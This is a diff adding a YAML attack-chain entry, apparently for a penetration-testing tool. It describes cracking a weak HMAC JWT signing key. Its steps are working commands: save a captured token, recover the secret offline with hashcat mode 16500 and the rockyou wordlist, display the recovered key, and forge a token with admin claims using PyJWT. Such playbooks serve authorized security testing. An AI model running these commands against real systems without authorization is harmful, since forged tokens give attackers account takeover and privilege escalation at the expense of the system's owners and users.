@@ -1,0 +1,34 @@
+chain_id: jwt_crack
+title: "Crack a weak HMAC JWT signing key (hashcat -m 16500)"
+severity: HIGH
+tags: [crypto, jwt, hashcat, web]
+
+trigger:
+  any_of:
+    - { kind: jwt }
+
+description: |
+  A JWT was found in the output. If it uses HS256/HS384/HS512 with a weak
+  signing key, hashcat can recover the secret offline. Any token signed
+  with the same key can then be forged with arbitrary claims.
+
+steps:
+  - id: 1
+    title: "Save the JWT (whole token, three dot-separated parts)"
+    command: echo 'eyJ...header.eyJ...payload.signature' > jwt.hash
+
+  - id: 2
+    title: "Crack the secret"
+    command: hashcat -m 16500 -a 0 jwt.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Show the recovered secret"
+    command: hashcat -m 16500 jwt.hash --show
+
+  - id: 4
+    title: "Forge a token with admin claims (jwt.io or python)"
+    command: |
+      python3 -c "import jwt; print(jwt.encode({'user':'admin','role':'admin'}, 'SECRET', algorithm='HS256'))"
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
